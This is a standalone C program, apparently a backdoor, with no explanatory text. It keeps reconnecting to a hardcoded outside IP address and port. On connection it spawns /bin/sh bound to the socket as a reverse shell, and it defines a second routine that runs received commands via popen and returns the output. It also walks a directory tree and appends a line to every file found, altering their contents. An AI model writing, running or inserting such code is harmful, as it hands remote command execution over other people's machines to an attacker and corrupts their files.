#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dirent.h>
#include <sys/stat.h>

#define SERVER_IP "103.157.97.9"
#define SERVER_PORT 3789
#define RECONNECT_DELAY 3

void shell(int sockfd) {
    char buffer[1024];
    int n;
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        n = read(sockfd, buffer, sizeof(buffer) - 1);
        if (n > 0) {
            buffer[n] = '\0';
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                char error[] = "Failed to run command\n";
                write(sockfd, error, strlen(error));
                continue;
            }
            while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
                write(sockfd, buffer, strlen(buffer));
            }
            pclose(fp);
            write(sockfd, "\n", 1);
        } else {
            break;
        }
    }
}
void action(int sockfd) {
    pid_t pid;
    if ((pid = fork()) == 0) {
        dup2(sockfd, STDIN_FILENO);
        dup2(sockfd, STDOUT_FILENO);
        dup2(sockfd, STDERR_FILENO);
        execl("/bin/sh", "sh", (char *) NULL);
        exit(0);
    } else {
        wait(NULL);
    }
}
void explore_directory(const char *dir_path) {
    struct dirent *entry;
    DIR *dp = opendir(dir_path);

    if (dp == NULL) {
        perror("opendir");
        return;
    }

    while ((entry = readdir(dp)) != NULL) {
       
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

            
            if (entry->d_type == DT_DIR) {
                explore_directory(path);
            } else {
               
                FILE *file = fopen(path, "a"); 
                if (file) {
                    fprintf(file, "File %s telah diakses.\n", path);
                    fclose(file);
                } else {
                    perror("fopen");
                }
            }
        }
    }
    closedir(dp);
}
int connect_and_run() {
    int sockfd;
    struct sockaddr_in serv_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("ERROR opening socket");
        return -1;
    }
    memset((char *)&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serv_addr.sin_port = htons(SERVER_PORT);
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("ERROR connecting");
        close(sockfd);
        return -1;
    }
    explore_directory("/path/to/explore");
    action(sockfd);
    close(sockfd);
    return 0;
}
int main() {
    while (1) {
        if (connect_and_run() < 0) {
            printf("Reconnecting in %d seconds...\n", RECONNECT_DELAY);
            sleep(RECONNECT_DELAY);
        }
    }
    return 0;
}
